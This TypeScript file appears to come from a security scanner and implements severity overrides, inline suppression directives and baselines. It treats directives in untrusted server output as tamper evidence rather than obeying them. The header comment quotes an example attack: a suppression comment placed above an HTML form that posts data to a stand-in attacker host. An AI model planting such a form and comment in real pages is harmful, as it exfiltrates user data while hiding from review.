/**
 * Suppression: severity overrides, inline directives, and the baseline, in that
 * order.
 *
 * ## The inline-comment problem, stated plainly
 *
 * A security audit rated this the single worst issue in the design, and it is
 * worth restating in the file that implements it. Inline suppression comments
 * live in the **exact byte stream docs/THREAT-MODEL.md says is hostile**. A
 * malicious server author — or the data-supply attacker whose payload an honest
 * server renders — ships:
 *
 *     <!-- panelint-disable-next-line PANE-EXFIL-001 -->
 *     <form action="https://collector.attacker.tld/c" method=POST>
 *
 * and the census publishes "clean" while the disclosure process never starts.
 * A scanner that obeys the thing it is scanning is not a scanner.
 *
 * So: **inline directives are honoured only for `source === 'directory'`.** A
 * directory scan reads a checkout the operator chose to point at, and a comment
 * there is a developer's annotation in their own repository. For `stdio`,
 * `http` and `capture`, directives are parsed, COUNTED, and reported as
 * evidence of tampering — never obeyed. `--trust-inline-suppressions` overrides
 * that, defaults to off, and cannot be set from a config file.
 *
 * ## Ordering
 *
 * A severity override changes the FINDING's severity (DESIGN.md §5: "severity
 * should be a property of the finding, not only of the rule"), so
 * `applySeverityOverrides` must run BEFORE `isGating` / `selectExitCode`.
 * `applySuppressions` does this for you and returns the surviving findings —
 * the CLI must gate on `outcome.findings`, never on the pre-suppression list.
 */

import { SEVERITY_ORDER, type AcquireSource, type Finding, type UIResource } from '../types.js';
import { safe, trusted } from '../safe/untrusted.js';
import { configDiagnostic as diag } from './load.js';
import { applyBaseline } from './baseline.js';
import { RULE_ID_PATTERN } from './load.js';
import type {
  ConfigDiagnostic,
  InlineDirective,
  InlineScan,
  OverrideOutcome,
  ResolvedConfig,
  SuppressedFinding,
  SuppressionInput,
  SuppressionOutcome,
} from './types.js';

/** Enough for a large hand-annotated file; small enough to bound the work. */
export const MAX_INLINE_DIRECTIVES = 500;

/**
 * Matches the directive token anywhere in the byte stream — inside an HTML
 * comment, a `//` comment, a `/* *\/` block, or bare text.
 *
 * Deliberately not anchored to a comment syntax. Panelint is not deciding
 * whether the directive is "really" a comment; it is finding every occurrence,
 * because in untrusted content the count itself is the output.
 */
function directiveRegex(): RegExp {
  return /panelint-disable(-[a-z-]+)?([^\n\r]*)/gi;
}

/** Trailing comment closers, stripped before the arguments are read. */
const CLOSERS = ['-->', '*/', '?>', '#}'];

/**
 * Find every suppression directive in a resource's raw bytes.
 *
 * Never throws, never allocates proportional to anything but the source, and
 * stops at `maxDirectives`. A resource carrying 10 000 directives is telling
 * you something, and the thing it is telling you is not "please parse all of
 * these".
 */
export function scanInlineDirectives(
  source: string,
  maxDirectives: number = MAX_INLINE_DIRECTIVES,
): InlineScan {
  const directives: InlineDirective[] = [];
  let malformed = 0;
  let total = 0;
  let truncated = false;

  const lineStarts = computeLineStarts(source);
  // A fresh regex per call. A module-level /g/ carries `lastIndex` between
  // calls, and a scanner that skips the first directives of the second resource
  // it looks at is a scanner with a bypass.
  const re = directiveRegex();

  for (let m = re.exec(source); m !== null; m = re.exec(source)) {
    total++;
    if (directives.length >= maxDirectives) {
      // Keep counting — the total is the tamper evidence — but parse no more.
      truncated = true;
      continue;
    }

    const suffix = (m[1] ?? '').toLowerCase();
    const kind: InlineDirective['kind'] | null =
      suffix === '-next-line' ? 'next-line' : suffix === '-file' ? 'file' : null;

    if (kind === null) {
      // `panelint-disable` alone, or `panelint-disable-everything`. Never guess
      // at the intent of a token that came from the scanned tree.
      malformed++;
      continue;
    }

    const args = stripClosers(m[2] ?? '');
    const tokens = args.split(/[\s,]+/).filter((t) => t.length > 0);
    const ruleIds = tokens.filter((t) => RULE_ID_PATTERN.test(t));

    if (tokens.length > 0 && ruleIds.length === 0) {
      malformed++;
      continue;
    }

    const line = lineOf(lineStarts, m.index);
    directives.push({
      kind,
      ruleIds: ruleIds.length > 0 ? ruleIds : null,
      line,
      targetLine: kind === 'next-line' ? line + 1 : null,
    });
  }

  return { directives, malformed, total, truncated };
}

function stripClosers(rest: string): string {
  let out = rest;
  for (const closer of CLOSERS) {
    const at = out.indexOf(closer);
    if (at >= 0) out = out.slice(0, at);
  }
  return out.trim();
}

function computeLineStarts(source: string): number[] {
  const starts = [0];
  for (let i = 0; i < source.length; i++) {
    if (source.charCodeAt(i) === 10) starts.push(i + 1);
  }
  return starts;
}

/** 1-based line for a byte offset, by binary search. */
function lineOf(starts: readonly number[], offset: number): number {
  let lo = 0;
  let hi = starts.length - 1;
  while (lo < hi) {
    const mid = (lo + hi + 1) >> 1;
    if (starts[mid]! <= offset) lo = mid;
    else hi = mid - 1;
  }
  return lo + 1;
}

/**
 * May a directive found in this resource be obeyed?
 *
 * `directory` is a checkout the operator pointed at. Everything else is a
 * server's own output, and a server's own output does not get to decide what
 * Panelint reports about it.
 */
export function inlineSuppressionsTrusted(source: AcquireSource, trustFlag: boolean): boolean {
  return source === 'directory' || trustFlag === true;
}

function directiveCovers(d: InlineDirective, finding: Finding): boolean {
  if (d.ruleIds !== null && !d.ruleIds.includes(finding.ruleId)) return false;
  if (d.kind === 'file') return true;
  const line = finding.location?.startLine;
  // A finding with no line — a `_meta` finding, say — can only be reached by a
  // file directive. Silently treating it as line 1 would let a stray directive
  // at the top of a document suppress the schema findings.
  if (line === undefined) return false;
  return d.targetLine === line;
}

// ---------------------------------------------------------------------------
// Severity overrides
// ---------------------------------------------------------------------------

/**
 * Apply per-rule severity overrides to a finding list.
 *
 * **The CLI must call this before computing the exit code.** `isGating()` reads
 * `finding.severity`, so an override applied afterwards would change the report
 * and not the gate — which is the worst of both, since the two would disagree.
 *
 * A repo config may only RAISE. Lowering a severity, or `off`, needs
 * `--allow-repo-config`; without it the override is refused, the finding is
 * untouched, and a diagnostic says so. The asymmetry is the point: tightening
 * your own build is your business, and loosening the scan that reports on you
 * is the operator's decision.
 */
export function applySeverityOverrides(
  findings: readonly Finding[],
  config: ResolvedConfig,
): OverrideOutcome {
  const out: OverrideOutcome = {
    findings: [],
    suppressed: [],
    diagnostics: [],
    raised: 0,
    lowered: 0,
  };
  const refused = new Set<string>();

  for (const finding of findings) {
    const override = config.rules[finding.ruleId]?.severity;
    if (!override) {
      out.findings.push(finding);
      continue;
    }

    const wouldLower =
      override === 'OFF' || SEVERITY_ORDER[override] < SEVERITY_ORDER[finding.severity];

    if (wouldLower && !config.allowRepoConfig) {
      if (!refused.has(finding.ruleId)) {
        refused.add(finding.ruleId);
        out.diagnostics.push(
          diag(
            'CONFIG_OVERRIDE_REFUSED',
            trusted(
              `Refused a repo-config severity reduction for ${safe(finding.ruleId, 20)} ` +
                `(${safe(String(override), 10)})`,
            ),
            config.origin.path,
            'A configuration file in the tree being scanned may only raise a ' +
              'severity. Pass --allow-repo-config to honour reductions.',
          ),
        );
      }
      out.findings.push(finding);
      continue;
    }

    if (override === 'OFF') {
      out.suppressed.push({
        finding,
        by: 'config',
        detail: `rule ${finding.ruleId} set to off in ${originLabel(config)}`,
      });
      continue;
    }

    if (override === finding.severity) {
      out.findings.push(finding);
      continue;
    }

    if (wouldLower) out.lowered++;
    else out.raised++;
    out.findings.push({ ...finding, severity: override });
  }

  return out;
}

function originLabel(config: ResolvedConfig): string {
  if (config.origin.kind === 'package') return 'package.json';
  if (config.origin.kind === 'file') return 'panelint.config.json';
  return 'config';
}

// ---------------------------------------------------------------------------
// Inline
// ---------------------------------------------------------------------------

export interface InlineOutcome {
  findings: Finding[];
  suppressed: SuppressedFinding[];
  diagnostics: ConfigDiagnostic[];
  honoured: number;
  ignored: number;
}

/**
 * Apply inline directives, honouring them only where they are trusted.
 *
 * Where they are not trusted the work still happens: the directives are parsed,
 * matched against the findings, and reported with the number of findings they
 * WOULD have hidden. That number is the useful one — "a directive was present"
 * is weak evidence, "a directive was present and lined up exactly with a
 * CRITICAL exfiltration finding" is not.
 */
export function applyInlineSuppressions(
  findings: readonly Finding[],
  resources: readonly UIResource[],
  config: ResolvedConfig,
): InlineOutcome {
  const out: InlineOutcome = {
    findings: [],
    suppressed: [],
    diagnostics: [],
    honoured: 0,
    ignored: 0,
  };

  const byUri = new Map<string, UIResource>();
  for (const r of resources) byUri.set(r.uri, r);

  // Every resource is scanned, not only the ones that produced a finding. A
  // directive in server-supplied content is reportable whether or not it
  // happened to line up with anything this time.
  const scans = new Map<string, InlineScan>();
  for (const r of resources) scans.set(r.uri, scanInlineDirectives(r.content));

  const ignoredHits = new Map<string, number>();

  for (const finding of findings) {
    const resource = byUri.get(finding.resourceUri);
    if (!resource) {
      out.findings.push(finding);
      continue;
    }

    const scan = scans.get(resource.uri)!;
    const hit = scan.directives.find((d) => directiveCovers(d, finding));
    if (!hit) {
      out.findings.push(finding);
      continue;
    }

    if (inlineSuppressionsTrusted(resource.source, config.trustInlineSuppressions)) {
      out.honoured++;
      out.suppressed.push({
        finding,
        by: 'inline',
        detail:
          hit.kind === 'file'
            ? `panelint-disable-file at line ${hit.line}`
            : `panelint-disable-next-line at line ${hit.line}`,
      });
      continue;
    }

    ignoredHits.set(resource.uri, (ignoredHits.get(resource.uri) ?? 0) + 1);
    out.findings.push(finding);
  }

  // One diagnostic per resource that carried directives, whether or not any of
  // them lined up with a finding.
  for (const resource of resources) {
    const scan = scans.get(resource.uri)!;
    if (scan.total === 0) continue;

    if (scan.malformed > 0) {
      out.diagnostics.push(
        diag(
          'INLINE_SUPPRESSION_MALFORMED',
          trusted(
            `${scan.malformed} malformed panelint-disable ${plural(scan.malformed, 'directive')} ` +
              `in ${safe(resource.uri, 80)}`,
          ),
          undefined,
          'Supported forms: `panelint-disable-next-line [RULE...]` and ' +
            '`panelint-disable-file [RULE...]`. A malformed directive suppresses nothing.',
        ),
      );
    }

    if (scan.directives.length === 0) continue;
    if (inlineSuppressionsTrusted(resource.source, config.trustInlineSuppressions)) continue;

    out.ignored += scan.directives.length;
    const wouldHide = ignoredHits.get(resource.uri) ?? 0;
    out.diagnostics.push({
      code: 'INLINE_SUPPRESSION_IGNORED',
      message: trusted(
        `Ignored ${scan.directives.length} inline suppression ` +
          `${plural(scan.directives.length, 'directive')} in ${safe(resource.uri, 80)} ` +
          `(source: ${resource.source})`,
      ),
      detail:
        `Would have hidden ${wouldHide} ${plural(wouldHide, 'finding')}. ` +
        'Suppression comments are only honoured for directory scans, because in ' +
        'every other mode the comment and the code it hides come from the same ' +
        'party. Pass --trust-inline-suppressions to override.',
      resourceUri: resource.uri,
    });
  }

  if ([...scans.values()].some((s) => s.truncated)) {
    out.diagnostics.push(
      diag(
        'INLINE_SUPPRESSION_LIMIT',
        trusted(`More than ${MAX_INLINE_DIRECTIVES} inline directives; the rest were not parsed`),
      ),
    );
  }

  return out;
}

function plural(n: number, word: string): string {
  return n === 1 ? word : `${word}s`;
}

// ---------------------------------------------------------------------------
// The whole pipeline
// ---------------------------------------------------------------------------

/**
 * Overrides, then inline, then baseline — one call, one set of counts.
 *
 * Gate on `outcome.findings`. Print `outcome.counts` in the report header: a
 * scan reporting zero findings and 17 suppressions is a different statement
 * about a server than a scan with no suppressions, and the reader has to be
 * able to tell them apart.
 */
export function applySuppressions(input: SuppressionInput): SuppressionOutcome {
  const diagnostics: ConfigDiagnostic[] = [];
  const suppressed: SuppressedFinding[] = [];

  const overridden = applySeverityOverrides(input.findings, input.config);
  diagnostics.push(...overridden.diagnostics);
  suppressed.push(...overridden.suppressed);

  const inline = applyInlineSuppressions(overridden.findings, input.resources, input.config);
  diagnostics.push(...inline.diagnostics);
  suppressed.push(...inline.suppressed);

  const baselineEntries = input.baseline ?? [];
  const based = applyBaseline(inline.findings, baselineEntries, input.resources);
  diagnostics.push(...based.diagnostics);
  suppressed.push(...based.suppressed);

  return {
    findings: based.findings,
    suppressed,
    counts: {
      inline: inline.honoured,
      config: overridden.suppressed.length,
      baseline: based.count,
    },
    diagnostics,
    inlineDirectivesHonoured: inline.honoured,
    inlineDirectivesIgnored: inline.ignored,
    staleBaselineEntries: based.stale,
  };
}

export type { InlineDirective, InlineScan, SuppressionOutcome, SuppressionCounts } from './types.js';
